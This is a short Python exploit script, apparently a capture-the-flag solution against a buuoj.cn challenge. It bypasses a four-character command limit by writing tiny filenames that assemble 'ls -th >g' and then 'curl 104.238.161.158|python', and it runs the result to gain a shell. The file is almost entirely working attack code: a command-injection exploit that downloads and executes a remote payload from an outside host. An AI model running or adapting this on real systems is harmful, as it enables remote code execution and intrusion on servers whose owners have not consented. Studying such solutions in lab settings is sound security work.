import requests
from time import sleep
from urllib.parse import quote
if __name__ == '__main__':
    payload = [
        # generate "g> ht- sl" to file "v"
        '>dir',
        '>sl',
        '>g\>',
        '>ht-',
        '*>v',

        # reverse file "v" to file "x", content "ls -th >g"
        '>rev',
        '*v>x',

        # generate `curl 104.238.161.158|python`
        '>sh',
        '>ba\\',
        '>\|\\',
        '>8\\',
        '>15\\',
        '>1.\\',
        '>16\\',
        '>8.\\',
        '>23\\',
        '>4.\\',
        '>10\\',
        '>\ \\',
        '>rl\\',
        '>cu\\',

        # got shell
        'sh x',
        'sh g',
    ]
    r = requests.get('http://e9d22aad-6b76-4b8a-8c8a-203891955c5d.node3.buuoj.cn/?reset=1')

    for i in payload:
        assert len(i) <= 4
        r = requests.get('http://e9d22aad-6b76-4b8a-8c8a-203891955c5d.node3.buuoj.cn/?cmd=' + quote(i) )
        print(i)
        sleep(0.1)